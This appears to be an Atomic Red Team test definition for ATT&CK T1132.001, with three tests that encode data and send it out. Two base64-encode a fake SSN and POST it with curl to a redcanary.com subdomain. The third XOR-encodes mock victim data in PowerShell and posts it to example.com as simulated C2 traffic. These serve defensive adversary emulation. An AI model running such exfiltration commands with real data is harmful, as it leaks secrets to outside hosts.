{
  "attack_technique": "T1132.001",
  "display_name": "Data Encoding: Standard Encoding",
  "atomic_tests": [
    {
      "name": "Base64 Encoded data.",
      "description": "Utilizing a common technique for posting base64 encoded data.",
      "supported_platforms": [
        "macos",
        "linux"
      ],
      "executor": {
        "name": "sh",
        "elevation_required": false,
        "procedure": "echo -n 111-11-1111 | base64\ncurl -XPOST #{base64_data}.#{destination_url}"
      },
      "input_arguments": [
        {
          "arg_name": "destination_url",
          "description": "Destination URL to post encoded data.",
          "type": "url",
          "default": "redcanary.com"
        },
        {
          "arg_name": "base64_data",
          "description": "Encoded data to post using fake Social Security number 111-11-1111.",
          "type": "string",
          "default": "MTExLTExLTExMTE="
        }
      ],
      "auto_generated_guid": "1164f70f-9a88-4dff-b9ff-dc70e7bf0c25"
    },
    {
      "name": "Base64 Encoded data (freebsd)",
      "description": "Utilizing a common technique for posting base64 encoded data.",
      "supported_platforms": [
        "linux"
      ],
      "executor": {
        "name": "sh",
        "elevation_required": false,
        "procedure": "echo -n 111-11-1111 | b64encode -r -\ncurl -XPOST #{base64_data}.#{destination_url}"
      },
      "input_arguments": [
        {
          "arg_name": "destination_url",
          "description": "Destination URL to post encoded data.",
          "type": "url",
          "default": "redcanary.com"
        },
        {
          "arg_name": "base64_data",
          "description": "Encoded data to post using fake Social Security number 111-11-1111.",
          "type": "string",
          "default": "MTExLTExLTExMTE="
        }
      ],
      "dependencies": [
        {
          "description": "Requires curl",
          "prereq_command": "if [ -x \"$(command -v curl)\" ]; then exit 0; else exit 1; fi;",
          "get_prereq_command": "pkg install -y curl"
        }
      ],
      "auto_generated_guid": "2d97c626-7652-449e-a986-b02d9051c298"
    },
    {
      "name": "XOR Encoded data.",
      "description": "XOR encodes the data with a XOR key.\nReference - https://gist.github.com/loadenmb/8254cee0f0287b896a05dcdc8a30042f",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": false,
        "procedure": "$plaintext = ([system.Text.Encoding]::UTF8.getBytes(\"#{plaintext}\"))\n$key = \"#{key}\"\n$cyphertext =  @();\nfor ($i = 0; $i -lt $plaintext.Count; $i++) {\n $cyphertext += $plaintext[$i] -bxor $key[$i % $key.Length];\n}\n$cyphertext = [system.Text.Encoding]::UTF8.getString($cyphertext)\n[System.Net.ServicePointManager]::Expect100Continue = $false\nInvoke-WebRequest -Uri #{destination_url} -Method POST -Body $cyphertext -DisableKeepAlive"
      },
      "input_arguments": [
        {
          "arg_name": "destination_url",
          "description": "Destination URL to post encoded data.",
          "type": "url",
          "default": "example.com"
        },
        {
          "arg_name": "plaintext",
          "description": "Plain text mimicking victim data sent to C2 server.",
          "type": "string",
          "default": "Path\\n----\\nC:\\Users\\victim"
        },
        {
          "arg_name": "key",
          "description": "XOR key used for encoding the plaintext.",
          "type": "string",
          "default": "abcdefghijklmnopqrstuvwxyz123456"
        }
      ],
      "auto_generated_guid": "c3ed6d2a-e3ad-400d-ad78-bbfdbfeacc08"
    }
  ]
}